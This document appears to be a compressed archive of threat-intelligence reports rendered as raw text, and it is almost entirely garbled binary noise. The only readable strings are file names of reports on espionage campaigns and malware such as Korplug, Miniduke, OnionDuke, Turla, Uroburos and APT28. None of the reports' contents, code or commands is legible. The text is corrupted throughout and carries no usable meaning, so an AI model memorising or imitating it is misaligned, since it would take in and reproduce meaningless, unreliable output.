aS;0
5[B&
(-#9
dY<L
X@,r
-],*-
72Po]
BgS|
!a\u
Er4S
Bf,9,>
@#8!
?\j=D
z;.2
1y'Ph
kI!E[
+pq4B
]1Hd
G|gq
41sd 
5Ri7
5?e9
5o3h
yIFl
ul&'
q(])^
Nv%fj
*X]i
BWu2
F\#|
bj@!
XN0 6
c.`H0_
q)O$
2jkt
^w.Q
<Y`A
rV'i
T%b
wL=8b)
2sU^
g[bq
@2{&
`IQM&
-rjM;
(,ym<+_"
Gv,Q
?oMs
1V>Z
z )>
+&b3K
so8r
fjnX
h1t6$R
I=dTnZ[
n(a(
}NJB
/ s,
X9{IGzd]
xN Q
i|n-
11/?
L_+.$}
+ubUs
EM(*x
r*{ofA_'
(tI]
v=XkrQ
K|(fn
yxK%dn|
O$kN~
zJ37
(x%0
kF}>:
=]>aI
6vqg
ih(r
g%lW
.}>q
&p#$x
au\>w
`F5$
K:tyL
.StCJ
x7ovR
~,hb
HBkZ
(*_d
K@][
JfJm
R^V=+
>LkB
S-~6X
/vT(q
}+8i[w&[_{
CV6}
>>J~
v\1MQW0
eXq*
T3~6
et]T
tbjV
q/q[#K
n|_3Ri
z%['d
@7Gc
lLjGx
xdP$
m-.e
}w^9H
w]Y*
`a~l
$hAa
`7Z65>
+kJL
AEA=$H
i3R`Cv
?:N}p
9klO
FSc~
Korplug_Afghanistan_Tajikistan.pdf.txtUT
GAMJs
orpd`
Gt,;Y
)jlo
>\+s
R#-m
?q"hZ
4xl[
P^U'A
I=a>Q
,TsL
Ne,T
dQ|
x:u\
|RSs%
<4eQ
jNdr
^s&cw
z%agMQy
jEo7
2?y}W
Puj}
#y]G"m
{U0A
L O^&
iaI8
"jt%
P9\H
g{ 1dN
"t$L
!1~#
bg{}
%/#|
I9}5
zh.Jt_
%8d8
V:~V
(5qS0F!
pF$O
8Z;2
y.$7
1.p:D
p'QpP
W4,(
%[:'
G'(a
g\jt
aw8@
}Gfn
QGk%
6A[E
Rg"tb
0B>8
I~pf^Z
N2\)p}
%AG*
P%05
Ih3F[
'1mql
I] m
FVC|
Micro-Targeted-Malvertising-WP-10-27-14-1.pdf.txtUT
Y%f/
f"hj
1gi9
RCu!
_<P$\p
-HIy_
S\8(
!vrC
A"i;
IgLZ
K9UK
t9y s
*cjbcU
J2W3
[1?0k@
YUe=
ymgm
[2L*
8j=w=A
\-Gl
&+._yev
fEYC
^s9e
5Sbr=
91Q-
zTEX
V-m2D?
',mK
M1LL@
p|8A
s9F,
.J6jy
 bq!
x{g&
2z%
lJk>
Q"bt
GT9}
V%97u
;c-4
0L-^
X8*E
%"&g
lH;"
DTL8i
2Wo1
s^0[
}):k*
*poW
E)`XV
hUWC>i
2H[H
Df@~
>fdB`r
Ky]'
CFEF
BW<Dg6
:G=f
~`6G
EW]
"'9
M4fu
bli8
,dEobtY]
;B0^v
0<j#
qui%U )
[gJw
jJQ\
5jm2
(1[5:6
JzrX{
8p"3p
1[B%.
tFr@
J&)A7Y
klPn
}MeL
}SdC{
Z\4G
j7g|
3zUM
T'"X
b8!^
Cgi0ue
hY9:
;okp
aO%5#v
RM6W
)x9
rsomP
Ok{i
h/=F
W5'.
nk_v
;BsNJ6=
@,n8
1u k"
fRS#
>LeR
Qr3a8
TdS0
T.7Y
R),~
'M#!
&pY:
)_Fr
"1gl
*H(.
5-ED
W:]Z#*
k%=s
[x;B
e[+&
{R &
QT_3]
L2t[
02}+ 
JZwp}5c
9@?[
VJ3J
5DBP
j_zQ
D`n$w
]"uqM
iu{A]
Pn;P
BM;w
6ZD<,
! ~4
(a$l
X2rm?z
bh<@SPs`uY
[wn5
i3#HD@X}^
*s?+
+S-.
P#ZT/|
cE\p
yBZ)lJ
{t6(!
Ai#Y
FBI/
:o>c
>-(%1
'6:4
a<HXN
n.bX
ziXV
vt8PH
^rPM
9ZF#
RN:H
bk^n
"U0[
3M$W
0M|C
{=`wK
79m@k
uEki
?^\<K
Y5FV
yNGO
<27A,
C(J}
TO?$
yC=&
qjsdQ
a/}^
x~siL
_mMe
HXx%
d$Aq
gj`j
,RC~#/=<
}q3N
;*lD
!o+J-R
yV_\
ils:L
:rN[
8&\L
QBcEF
|wMj
q(Tm@H
T<xU
8p]=
6E,P
#cE+
ySTf
pelx
pydV
xqUF#U
9BR7
;1F_
xERe
h|!Q
%O2L
Ow:\
CT}a
V6JX
;QT.v]
|@s7
]'~v9
CT+r
(])t>
1fU[<
nlQ7}
blcP
SHje
5Xe\
<}/[
Q U-
Ys}\
{EF-
QlGcj
\rF/
9`~ZpU/
vs[J
OcX\
eAs-;
9{Ym
Q@ i
c/j5
a.)U[I
 j9;C
yLqc
\wmQ`
)YEHz
6;j~
sd-F
r^pe
]ZZ!
<qXPK
Miniduke_twitter.pdf.txtUT
i+`MjIh#
\ydy.
_3"i
WS1U
LcV@
0 uO
x@=0
{_e6
]l}"
Rcg5
3\lbS
seX>
"C]s
MXE^
DB|j
[L2l
1Cxu&
'ykq4
FlU!
jmDsq
HyD|
0Z.&I
?Q6Z
lhwJ
1/+p
2c%aA
\&&O/
[{UMf
GA9\P
dr~R^
BotA
|Vb%
l=A!
^tL-
|Or>
m+'zZ
+Aoo
V0vD
h@=G
4n-B
DY`:#
$~sB/C2
E/egD
}=S1
dO(y
C?r!
_oo+
-7V"
/C-
^,W3h
#nB8
O 04
`Dt/
haE-'
4J-3K
[v:>
Eyf6Qgt
6Fdo
:4e&
DsO<
;5b73
zdUH>
?p2H
:~fw5!
(2,W
,]eB
NYTimes_Attackers_Evolve_Quickly.pdf.txtUT
j?f6
Em?#vV
zDi,
**7S0
P3j]
9|=0
XhTW
FSJG
R*`d
,sf2s
c.Hvgw
_WfV
F_,r
#$P}
C2SQq
=\*'
,%)mJ
:]>$C
gIk2
~d=-
q\'q
/5[p,
&xxE
V6ufr
g*s$
1Rjn=T
U,`m
Z~sP
"[~TQ2z
.tQ,
[xua
V&v8
zgvG
;C(;X
NetTraveler_Makeover_10th_Birthday.pdf.txtUT
|\n
NJcb
k;<'
z.YN
x&NY
p^s=
h+Tq
CA&k
q/j}
}L?R
"7+1
eCpU!
;O;|W
FG v
%\2k
dv#a
yg=!.B8
X:|-
Q[{#
&s}f
3u<Bj}i:t
KRv`
^yJN
)_E1&
8f0l
gm<!
e>DT
qiEA
hqB\
n-@>
a;TX<n
:\,L*
#R%;Hz
A0k{zpKW
Na0{
Sg~V8K
y}Id[
n%U<
*^SQ"
8xtY
y'&hC
OnionDuke_Tor.pdf.txtUT
(f7j
b(sV
AZ\/
IdtUp
M?n5
>"L?TmS
CYe+
=30wy
O_x6
T=UM
4B5p
Xcgk:
:.8`^5
?Elj
%X>>F
0VRx|
1^2O
Y-rY
-6_8
vyd6"
)-O/n
T(8!
V<[?2sp
]A4hI9
=m{
r1$)
 |=5
WW*>
#0Efb
's(}
|J4L
WTl2
1IZ;
&2ki
E<D
O(ba
OperationDoubleTap.pdf.txtUT
`4T){eD
1@WK
|pdY
G9mcF
?-j"
[8G 
{;W8`b
qLKH[
b(W|N
9'3O%
4udRRp
eJEb
|BnM
e{IoE
:Yfa
c~^5
wqkB
?}]@N
xNR`
W2_s
iX11
jTI
\3sk
jbt?
~g0[
5s!)
i$^}
z=s}F
B"z^
5.E{[
^~#3
_8`M
7Y,dU
Dm D5A
`WrM^r.2'j_.
<\*0
L<@9
uRS,
R%TzRQE
Te<q
iYRy
R]r.
~';N
(ypK
]WXA
Operation_CloudyOmega_Ichitaro.pdf.txtUT
`]1'XN
D#jI
eMY<
kjZL
i\.K
&")%L6<a,
>'OR
}l+r+
]9T,Y
b#83
rN B
tqE3
8\'R5
p=B"
d"Z<
$(Ftmm
)^R(n
i%eO
^H^n
UTIX
E@-U
w(n@
z0Iy
y[|R
44s#_
mgj!m
F?<}4
\r;14D+
<"$-
a6GO
{2fJ>
k*O_
>1TD
FCc^(
BqLw
ph){F7
Q@"G
1ge:S
&qZ%]
BwD{
rub%fB)
d"d@
w8Z,_
F4+H
G/=D
N|Vi
P'-GG
6,FR
$A?U
}y|V["}#0eo9aB
;i"}
+$%O
Operation_GreedyWonk.pdf.txtUT
^$Ev
u2v,C
Jp7'
-%,t
b#=g
YJ~J-d
AA'ev
?|+,
/Kt_
7E9W(
2oF$I
zQO,
NJpt
s-}b'
/A_a
}a j~
s.2K
 #1`
&=P-
<wWP
n%6jz
%;G[J
E/5^
t[~W
ss -
d}7A
|6%Z>
/0ws
cp^r
g%t[=U$
FPIu=y
/|fz(
x!x,
Ylj#
8$ueQ7G
:SGE
\ab]
bK\!
f~X 4
o2mD
Z}|N
|1hk
rQ'9
Operation_Poisoned_Handover.pdf.txtUT
%Ys 
#0'3F:
1H~o'
aR%7
%]$d
h=_[K
w/l}
~gG,~
M>:
K6&#3
u%R^
8;\9
@(c;
<vGn
8X0A
)"bz
@H!
AyjM
rGn&
i]"o
X_JZ,
-@@e)
3.^H
wZl,KY
>Ph3
=qyB"EV
$t$-LX
G-A^O
GpYo-5
[SjI
7}'l
i20F1Z
e7rR
\\cE1U~
"t;l
fg41`n
f0SA
n8EI
oScG1a
o!^Vo2
"Si "
g=)K
}b(+)
mFzI
TK/fk
G'BJ
d*8!^E
;:Tea
hE|;o}
FQ1_9;
tql?
f<(E
gGl,
Ee"|;
rgo)
Ep,Mok
4 _<
*9V
P*jA
4`d;
%&ae
']*\
C#f;"
$6PK
Operation_SnowMan.pdf.txtUT
nL/zw
9@>h
=2~awm
h{D\
c^YM
uBy*9
BSMA
IssOu
v2'$
J4Tr
m\jGT=
#|F$
#$~2Ak<
J<Ly
^%q{N
TNh
W*Bkl
/B*y
9 #A
'_ha
`u0l
P<W'0
)}.Q
f{7{
$Igi
0x+-
}MKZ
AgJw
VZ*C
Tki5
!nB/
3"},
ahWW
/=!j
Q;lt
=[9P
ef9
'GwIkZ
\`{*
_t:`!
dy!j
y}Q8p!~
aAJC\
M[H9
%<'MJs
5k'L4Su
,!sT
-:s>F
h"*-
{w}E
:g{tc; 
#<F;
Fh-S<
+F/RP
Llo;7
bX1i
I=BqUpHu-
+%;>
J.VZm
Pitty_Tiger_Final_Report.pdf.txtUT
|g|ah
DG>+y
mt1MJ
uJMN
gNU*a
V~d=
X606i
3Q5DL
<8sZ
 r8o>
iD?2
!:zS
eR8E
)G8t
Ao3Je
4kTeE
?X(Vk
+SR?P
~{,'f
--]"#=B
G%WG
5J$S(
@J^`
bwf6
wp+{
Z!w{
?<Qv
=AL%
$:E9)
.l//
.~{K
d#"\
nac]g
je!x
H3hZ[
\<.54
!eg~
o:le
A21R
s|ky
/x{N
aC*W
N4]C
!(!o
!6#Dw
%g|*
KQ5:
$[we
rs77o
Fr*>|
|q/5
?O}yQq1
P2j(
jucw:
+`_D3
E,%H
:4f|
`M$;
&bIp
pnj5@
:#*
ElE!
DTU|A
Y}f]#
%Mge.
H/E?
}m}Hx=Q
S0OfAvE
5@n
I5"m
`P$6>(W
.0NFC
o*oN&
*fUL
maSa8
fFt/P
"9Qq
Al8)
zXVq}`
%l;\;
E\}w
>L,+0b
4'biH
JT@L
'3du
=`I=l
lya\
,e(r
c4Jr&u
 I&*
 }mv
`7hb
#zPb
Hk!-
YhMG=
.YO/
dnZ9p~e"1
0g#~
 xkW
?uVt/
!~S=
0;PEO
J|5n'
,0:-^
9Es;
n,!l~I
(;t2RGO5z
T.N^
;y98
S\mfv=v
0a~e
ko.Y
8C(h
j9p<
Y *e
Z|vz
Chs}
|Rf'
rU9i
_Lqt
iEyO.]~
L/>i
@*z!
.p&9XN :]
sEc4
f0?X
vfUf
L}3_y
g=T<
)CYH:@
q]GF
*%I::^
`$QT
?xYc
&[Y+
)\$8p
nF;:
;p."
9@F6E/qdY
_VuB
L'rB
hYV4R']
,-ZJ
7_&oK
4D`L
puVb
vf0H
-i~ViS
hToqb
I^hI
[BMD
4SJ#
iG]*
_Nz=f
D[&G
}q^@
=`93
I;g8
-s'm
i:l'>
h"+M
H>^ BK$
yXQn
Y5UA
[_8@
PPiX
01/>Y
,p(Rq
|B^86*c{#
e}1P$
tu_i
co+6
Mmfr
_v6O
bj T
{xxv
F{0X
N,|L
x}5v
:s':
;ygMj
a<WW
8nUv
9nXO
:WI =
c5r^
+~j4
'q{P
4$`Z
\BN4ye
}h*X7
3W&J7
AH+S
<3IZ
R;>_
J3a7
|V[sS
y\IP
9'Z0
aZn1Q?B^
MwhS
)D<fp
@%7y
[-zj\R"
5&,(%4`
\=&f
de[^zV
':ph
@p"7}
tyLd
+=SQ
01#yF
-Vo/>
w)<m
"}LPA
8Y/#N
)jGWa:
$v(b
Pwno
H.C)
:>Dh
?5p:
-]ufW
}Ko4i
$. ~vb
J?FL
hwrv&^
wFm#
P+tZU,
+B~g
Tip!
3U@}p{
h\QG
!W.@
{?#
u<>BW
-6;*
tT|4
YY[)
XR1A
s0 z
[>*0
6VU6A7
;FDu
F*(b
2 7%
hS]j
2sh}
EvLe
|~(hE
W[oX
C5b^
ehc#f
y0nh
KmR"
x\qW
DWS^t
lg2t
\^^~
#a*[4i'
qM<N
h^U\
j'Q,j
vge.W
mulD
iXnHD
ixdC
x|Q~
Sa{-
m86vA
]S>?BD
u-/y8
,2^~Y
W%mM
K6)@
V9Z&
Hx|L
X3>e
eL.v
&sJN3
{/z4
9B3k
o4#\
[~XGk
2ah0
USlx
eP`$
Pcq=
H1i|
Z@J"E?
$f C2
,lVgC
6>Wn
6cs6j
^ZXu
5-.R
20|g
/?)M@
C5-Y
IU"av
1ypj-
t~)]
TE"6
-P"`
g*jj
4z!b
!%WUw;
\Nq&
%B7Q
`.hT
E_kU
^.OcA
g_zI
K\/}
_a`ZNc
67LX
z*Gw
g}FA
s.w@
B3 `
ur<)
VmGx
1<-Yo
l.7w
+A\3
ZeBp
C&MM
Lp]Y
%Lej
!]9|U
GMib[
*?@TFL;
jfv ;
-}|Q#7q*8
\H)5
,*[Y
Hi]0Q4B!
@8`'
rATD
Z0N
Y8vp?
!.I:
|T.q
yj~m[_d
 cMYmg
'Mmi
,kZs
r*)f"g
|r/S
J>+`
j.nw
/b{#
odi%
rX/KW
.VZm
Regis_The_Intercept.pdf.txtUT
s5>-
7a 6
?,1}
C\dq
o&F7\
T56Y<V
N1YP
k(Ys
7C-#
v2&U
ijZr
i^(H
wG;{
mpx^
c#Az
@)+`
N}D +
;]]d_
}2a
h;y!1
F\Xl
yZO'
c=yh
^N|`
QD&[
4%AzE
=R8`vp
)>tB(#
y~-R-0
5`Vl@A
Znk(
J>C]
]>uf
?Ab;+X4
i1fh
Aw ^!y
<Q&~W0
1A=j
AU9Z.
y: c
=rlfk
(uEg.F
xfv>&
x*%0
pK:#
/c3d
K<Y^
kue^
`R{h
fA^_
(ETy
CTxR
:9zfe
G{%O:
=}X2(q
qe|
fk3,
j)`/
b\Bm
z6NL
dkdd?l
pN2;
c%t(
-%DR=
KgXF
N2SW
 ~:}
dg\iT(p
R=/J
gIj`
)G2dOzi
AEJ_
,mLn
JbL(
Z's#
}c'y
7!9_
sd^2
f.Kb
323m\
'YUH
*}Kc
?Y#]S
DgR#
YC:;
O`j:
JW">
$u'L
zO*[&
ilMd
7d)]aI
6>|o
pT6.Y'
ePf>q
XXEP
hsZv
|Dhx-h
%?k#u
]$n(
vz*$
hw(4
)wUr
3jx*C
joY*
!CI4
(oun=n>
6"XB
JZ3
TA14-353A_wiper.pdf.txtUT
1l,hJR
_IOx
8R/==
fRSg
mzo6
"YKE
{crm
'7I+
^dlt
c@Xa
!UUAn
)AV<
"Wl X
0v?Z
vzxtl
X-8|
r#:4P
_`*$
(L98
;:!1
s#TZ
J$8n
QF2X
:PnT
cv',
jtQNd
QBY
-#{S
UJWG
*bjgC
ek=P
uIes`y
<[O]0OO*Y
C=!O
T Fk?
66)_
-75SA
Govw
*j^=
YE_fW
[O]w
\h.j
Yh)SU
C:(~@
}`+%
:_%d
.C5W`
ypIi
Wa]u/
_Nqg
~ljb`
 \?;
g{ma
Zz,*
7g1j{YX
WEd~|
owo%5$Z
a<j8
iZf$
"-e{
^RBs
u[/`
<]G<s
IMKc
5W+N
9eM+
bjA3
Gy'G&
l<cUS
$KUwCh
Tr0i
dp!U
S:[q
/4;-Q
UY7q
>PHS
i6Faf
x>r"
9<_M#
JLV^
Zyov
R(+*L
e%gU
l^(
V#O|Z
sY@}
SvXk2
lLm_
/!8Z\
;mkE
(Dx0?&
.b"c
Y/Id
?yX~#e\
(POGWp
Z#&n
l]]I
2Kgj
XwMM
J\NVX,
x)B5
s*5+m
ws+.
C[:
*FR*
fH:TkJKP
3%8
\ssn
u=t&
=l/z
=q2r
ZAun
S;0S
0ZeTH
maqX
4Qf
?etLl>
 |qys
[H+@
L!B/W
$;+3
/&E@
oC[3
 $Mc
q^TjJUBb
lvvV
@IV
Z$5K
BIK3
&%k!
C(<@!/i
Pq b
?9bx
f+x] 
RA^-LD'(
v1@L
2GC'
E%gN!
*`ZE
%%lS
*+QV
-W@
jkuIh
VF@l
4sA^
4$=n
:s^Y
?:@yb
$t/I
/sLu;
cIX^
Targeting_Syrian_ISIS_Critics.pdf.txtUT
L-Ji
7a{.
`{ca
?vwu
K"{o
&"Yz
oAO/
I|RX
K0E;
[3b
_-[-
D~(+
FT&d
\{fw
^}<F
NS4(&
]qR.
z3e 7
!?^N
2U@P
Uky
z+wJEKaw=Hs
?Y>6
i|19
P:M"
j4^|Q
^KX
6A|}p
6n/4
j$)!
Jpi 
Mo0V
yN`3nG
u=FUuW_ThI
jJze
Pb79
bM~$
3v5*
.ivwiG-y)
Gixd
a*l,
&_ec
B>*|k
p%=z
I*M~%Q?Q
a`.d
:$4x
8|m^
w"vt[
Cw=m
`=k~*l<<Xu
fpg>
VRX]
4t{k"
hDvF
!U7`
V:/n
0|-a
 %6.]
w#wg
xMKP
)MW:v
w/J~
ywIG<I
$w@e
~jQk
Vj"d=
<tQ\7
UfmEj
aSq])M1
e%j@
=.),
z;'$F
x,O^
lVkU
# H>R
'$z%
9ecDh
8^-e
0*GC
g,U2
eB3%
HHs>r
{"r<
iJdb
8%*<mbppRz
'_Pw
EOk4
[/}n
"K~H=g
L#?ni
/W2F
]?@|
QVJ>
HLCJ$
N(`j
,BcV
s\-~F
;T/8
:Q]yw
?lfSN_"
@rrj2
:!N}
R\W%
eE69
^+ygB
qkDy
p+O5
w`"[
3E+l
\(_n
\A%yR}
W5Kj1
;<7Jm
Fe@3
X4V/
n~`,
,v|@
A+?8O~<
=MCn6
|2Bo
A"vv
eHn]KU
^n&5`N
kxJd
1uPKKC
f_^J
J3Je
]1>d"
\pRk
dLV\v
A9)^"
{S5(
m$~,_
7u 
fe|!.
;f6.<
5X@0
/Fi-
L8(y@3
568-
SRO@~
]WNUH
0r/`@]
CH~A
:8i&
Ox,/
Eou2BCh
<Ffb
The_Epic_Turla_Operation.pdf.txtUT
QTp10
n15L
sYC8nn
fJ\y
@j?W0
.pNC
8gJ\
,b!B
R:J
Pu6}
N.ue
G=>*a
D:"'
]juN^
@BBI
&%
q_"WlQ
w7Ku
;4vT
s^]h
1yD'
C3Zv
90]_
|_c)
G~%}Ub
OpTe
zK)s
Q= p
7x})=
Ys#z
}LK:
(]-C
^h$t
/^9Vh+c
?@{>\
RB^X!o
zqO,
R\V.P
; :^4
SF/jI
lzo^twrZAE
LI{"
t&l9
['pA
 A\eR'KO*
-%TM1
\J]K
UZ8Pk
@{74v
!v4t
;&@M
/rkP
/mUrU
|chy
19Cgh
?L5h
x(scY
75MK
w2'0?
(2`W
SsUZ
B5BGh
pym-;
xyyX
/_v#hJ
qm2v
v #<
Hg_/t_
@`L(
/A}5S
)!YQ
}w5qC
T;%#4
o+Hf0Pd
qO=n
r%DB
Np3T
[HSZT
*f.-$i
ruZ_\v
]q#!}
BoE
{S1O
l<~1J
?s_*
ts&W
p-=iP
F+VU
Nn=4
-\RR
TF^[
_zQ/q
]<}Z
=k%M
=KR&
no9sE
L*Po
5V81Pu
<nrb
UZm2
5'Pj
RlxI
r:*_
$M,s
8U7Y!9
AJZY
wg9%(+
'=y&
Ou3aU
obYV(
(^GVY
p1}%*
']5<+
PX0@S
v]tz
)6qf
7^V)
0X`%^I
u;>SpR:
>jk&
^8:)
The_Monju_Incident.pdf.txtUT
XW#@
/l/<D
`{ST
41& j.
ikCtz
u/#c
\m2\v
Y)17
,n!M.
*wC/A?p
LIWt
SjhY[b
`>F\
q.a=
F/4F
6;%$
`VI6
$Bx1b-
Cs!?t5
QX?k
5r!d
+joj
D~jw
FC0)a
I *R
_TB@{*
G34b
G7oM
1&<-W
o`.6
\5?hJ
hf9I
H" b
fZs`x
rzRKpu
aD(9
p5I|
Gty]
0=%:
N}TwNC/
xC?<%s
pv&5
/fxE
CW*#
!z:T2}
W`gV\
eyMU
8IC@
=<c#BEV
9`!1P
_&radt
??gIq
Xcte
O2r8
Ysh]B!S
rq!yh 
QTpj
$x<!
XN^*]
`:Vl
yiY/
Q3B!
;ZN=
xXX7
)D!u
,w%F>_6
^$MYb
S5,dwT
G9PW
TpZ$
-TU6ln
`,+D
Ml5H.
,7w,
'4`1#
CVb]Kn9
M^Jt
vJYT
ScO[
p0W:Mx"Sn
vw/W
pY~O
zUqbT
P`B(
The_Uroburos_case.pdf.txtUT
%J$,
:=-
>s|D
]lv)I
B|/I<a
jtq
]}slzF
^4vI
v6]%
t{=
D>\&U
I3srs
QgHE
Qi=!
L'I}
Bi#W
p;)F|
8TF+
@<Q.G|O[
ZsgeEO
7l_r
NNiy~
\e88
{sR~H
(+RN=
@ .1
Z=t7
tDFY
~,Ce$}
}O'!
+*P0
[Mb
|bOy
.|mq
i[~dkS
?`7Ax
-T|,E
Mp+i
u7c&a
0sz4
s|MB
$#3;
Bl&`e7
4;,|BCy%7
mx\r
2fz=
}i?g
NUd]
N6Ov
L<l~l
|?t3;s
B6=C$
(`4\
df]A
<|Mh?x
x=wT
HEw$
ThreatConnect_Operation_Arachnophobia_Report.pdf.txtUT
bWR-m
e3KRC
TKA+Ul[
{MLx
5eb.
Ttyb
DLGV
m3W|
U03{
NW-Nx
1ehFspZz
TrIY
}jy_
FU.B
l\vG/I
l]yd
Wtmt\7
B$(3
DZ8N4
2X8C
y=bk
bd9e
0wZ"
,?-ORh
%zLP
2^G9
]M:
~Aw9
o</m"S
M`oG
B,Q\
.]V~
em58
u+|G
p'WE
g)4W
|4AI
1AfI}pySV
-*fQ@
u5I$d
XEP6
BAFf#
+)/Q
JBMH
a7Bv:
lk:]
F[uS
fNT8k
KN;#Yf
k=TL
`H[W
aNO?
gubs
_`hs
}Ay6i
&Pmz
2 t=
@E7(
P'Pga
:k=j
67Rs
&[W~
MEfJ&
kd3]
\El
Sc 5
3%J]
]N}C
O;30
[|:;
v!x
X:(r
@}sa@
MfUf
Ek]J
1NB8
%$a2x
6B@K
:[J/
 yRk
UMc2
.VN|G
-]d*D
lT2?
J>Xl
*lc6
9x+O
s('p
gm xSTe
oC"|*
NEt:"
c3NF
G>?k
Z=z
r$u(
~)N5P
&ri%
bunD
}C=R
c34@
tAo,
o)qS:
HEVg
&4 8
|Iw-$|
ool.
_kgG
Y'*W
C(;"
3^j]F
H0*G
yG3'
E6;cQ!
'dFk
AkW;
b'TXT
SRaX
z[lgd
xi85
c5NQ
mYSw
6z^6
-/\$
QI9m`
nHwz
dG(&
h_J4J
B_38
z&SS(WK!
4YUH
itB^
3!F;
wi>~
PR1\~6nw4
'-RYC3
^ULd
l6X&
H%}s
04P@
7J[L}
Rj@M
H5od
0dlE,
+J,m
\+fCZ
[>PS
C<F^
%t^Lv5
b7DSD
w^aHY4>
#kx#t
{WWF
 59;
Kxka
~kQ5
]w= 
azs61
WliJ$
Kj9g
R+C9
|dH]
NFN[^
aP}$y
dBNCF
50ne
MB%}Ly
,e:97
iv`T
-]@f
5txe
dG-I
f't\h
%T&Sx
gN1f
i-.Y
eNsR
TUd?
W5R(I
w%J}
Iv?U
\>JA
{$h^
1X5BYN
KUE)d
B:{1kn
Yb\\
.vOc
dO`X
?~C"
t+rwT=
N ;S2
En@6
6*\}r
0`3N
,p=9?
Go0r=h
"HSf
BP@u
)uRgv
1lc{
G!c]
*2sIJ
5=!EaX
e:G&
p}I@:wHb
185=|
7/9/C
;ioll|
V@Vy
fltP&
49g;
%w9S
R[EK
Y%|w<
OQI{
Um?2
j0EG^
rI-o_
T?2
m(%v
mu~s
qP78
]z#_}CJ=w
;1\NE
[8_W
d(6/
[8`;
v@f<"
nA4$
|#2IJ9]
ZTIW
"S6`T6*
?x 2
:s{D
VcLW
[gB,
]Q~xh
2>pj
kp}_
',c-x
Dy?0}
K[>N
sPk<F
Zl$=
{3Aa
sc:4L
Y6p)(
;4@w*
DnG^^
 |Er
Zu%D
T<r]|?p
fi3iX
6%ob
8RB&
lb+
%20M
)h_l
Fff=
H\6@&
eJT3
avP4
r7~]
tUx9Z!
= &o
d3Y<?
%y!T/
5I:3
2MS_
EN"
_h]*
/ I
DYzGy
;\ZV
#CEor
R(Y\)
"!q)
{y8y
8+mX9Y
+."|
sd'+
Utr\
KL4Q
D$DZC
@YBHj
.#`w
"',a0
l85Q
G<1O
PF?mp
>G=Tz
}#??
hs{~
m#h6Oa
:Ws^2K
r~2[
r#;R
5VMR
}LVb
F386o
3MS+O
fLUt
dX53
qgU"/T
O^U0
:5@$
S]N8
&HVf
$YE\
}U-W
8OGN
h8at\
`J _]
zp8F
@qDAS:Pb
^dmq
}I7@
PO>2
^r|T
+>;J
/]Dz
NG-G
 Ac^E
XkCW
6G9`V
QmF6
y#vR
A\A`]
+E37
_n1V
%^ig
EGls
*He*
{f.D
7DqO,v
#nA.
E?~uQ
fDkSY?,
&6gt
ts-N
.A9X
8"r?-k
jY]cZ
@nZ\2
}6V}
rcVt
%N}5
{nr&
F>$\
`$]5
XFGE
JdJ#D
 J'X5
e;;3#
Gz&i
9osUJ
C~2_
y*o_
P3't
 8x]
telx
%-JJH
l$1Tyt
_d`l
(5B7
Of\_
c.oyTS
EI)5t
jl%]W
G4'w
;>\/
F0m,B
fGg4e
C"jF#
GO.N 
^PCG
}t
jl<M
(_a$
]B!7?
;unz_
f3C3
_mC=.
5Ce@
fq@3c
<t"m
lZ7T
`GI`
j9E"
F]!'
b>Ve:
`rMey"
$e|?
h6]vI
RoK&
:\3flJ&
V#w
$CF^
x)-)/
zaCBM
ftEy}
ES5dV
W%]e4O
lIo5]8
RwPK
apt28.pdf.txtUT
1T4.
U(7As
/\s6
%h(5
{6OM
SPqN
U3'*
Q2gg
E\5\
 A_u
%@N(o
kPMu9
*{~o7aTG]
t\Pxmy<*#h4
>',F
2l-D
^8f,
(%%4
<X+4d
bZc'$
#r2n
_hwn
+QW
q.9cW
RK`8
x1dp
9~M
a>sb
t:ex
Z"fZP
Bxy
Y#1l
jl7|
h@PG
<#Dy
 Y]%
YNbW
/SaI
"9x.
k]vM
erqtPW,
UY0Q
B~h{
K4x|
 W|d\
jF&7Z
zkd7
X'H(
]Pz5
Aa@Zb
;MnbP
5}X`
FE'R
OW2c'
1\'&
3LvF
$xOj
|Sa[Y*
MsW;WeB
`g6m&
o_(`
]K}E
Yu/
dY.X
mE7n
M;q|A
ye]
(aB/f
a@?@<
w)*J
d?cQ
LViBHK;d
Az;G
OtPV
Z;?ZE'
!&gX
z1kB
umBG>
[vUT
Z>{`^/
t8/
Yl&F
h?A0
(sFb
v"Y1
47}U
4+x\7o
!w+^
3"N5
y"br
3Kx
nv<9
m#7/
(d*z
+\n
(r/e
Hcjp
z:=e
T{vS)
Hxw4
Npb[@
RLfHP*,e
+_xYP;
3b5
e`'N
&^z;
rcol
b\fj\_
1lmM
*h8=
B`cw
V\]V
xIz}
~uil=%
u{v|
~YyU
04p,
auiC
}Z+=u
wY#{L`
1#8q<
E om
:2E"
`?kuX
5A%s
)U~Nk
c<D,
QJ5S
3`{~
-pn+
g4m2
OpEE
[IqN0
 W{uC
ZVJQ
Jyh,
Fb[8v
!H@q
@0C&5
:lG@
,SDr
71@{
\<b83
&>dv
9.ca-
VEOiG
C3[J
QOq)
[p"jy
L-o;
yA +
8Gu{
kQDarE
+LapNfo +
.wZ1
7~bi
>zh;[
7K&b,
c*<M
Eyat
]B7
r]K#
p?GO
@S),
m,Z`z
wK0_
}&[0
k.e=
`nN2
:57+
qon&m
$5D{:R
(yTQ
}WD/A
V$t$d'
eV^a
q%W{%B
:QD}
qp_I
]&E^
9(Xv
,A:?-]
<X%RxM
06S/}
{x&P
llC("
ulCj
:j{M
 :YQX
cfy*
"30O
{(b=+
[Wg
+|5<
D_$X
([{V
>+2x
/'SK
`/\,9
HY|:
sdrg
<7 ^)&
r>Hz
nZy4
)E1z
u|Zi
%NNc
6`ho{u
&k"2
(J@&
DI?yV
o(mS
OwoO
6<@ZI*
&7%>
7~=a$
M_E)8d?
OUKz
l'A,
Nic_
G)# 
ytZm
eV/@l
en7P
1([)
;+iN
3+@,)
h<^q
.`Yz
XCgn
C+{e2QN
o,2p
#Wf0
 l|
^2lv
USoB
7$}D,z
x0v\
#y 
]:,=
H;VV
D-kt
c6`hm
I$(Xm
z;j0kE
.v1]M}q
GaXt
aXG<
?Y#F{
hMs_I
P&y>
1HUy+
Gw3Y
9.yn.
uMQ<
OBNq
_Xzd
 %jy+
:_0z"=
Ctg=
+`69h/
=OCG
9Y: 
OV2\
TzD8
Umq3
}7+E]r
O;*!Qm
%s_h!
hm ~j
S{/j{
QVp@
t]#o
9_&<
$[#-
|gh$
"B18
r=wbnAQ
 d|k
V$bB
Lxh9
iF4haW$
xTe?
=@<$
/%t!:
pmbJ
b;(4>
UJ8xE
*{U_
%kpM7
{-#q?$
6,#z
1M-x
Renj^
vF|d
aS@)
g`E-V
.n!=P5
[vD6
TN=^
27(%
C/R,
-I}//
o+23
